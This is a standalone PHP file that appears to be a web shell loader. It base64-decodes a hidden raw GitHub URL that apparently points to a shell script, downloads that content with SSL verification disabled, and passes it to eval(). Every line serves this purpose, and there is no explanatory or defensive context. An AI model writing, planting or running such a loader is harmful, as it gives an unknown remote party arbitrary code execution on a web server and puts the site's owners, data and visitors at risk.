<?php
$encoded_url = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3RyeXhhcHAvdW5rbm93bi9yZWZzL2hlYWRzL21haW4vZnJvbS90by9leC9mci9sc3Qvc2hsL3RnYS5waHA=";

$remote_url = base64_decode($encoded_url);

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $remote_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$response = curl_exec($ch);

if($response === false) {
    echo "cURL Error: " . curl_error($ch);
    exit;
}

curl_close($ch);

eval('?>' . $response);
?>
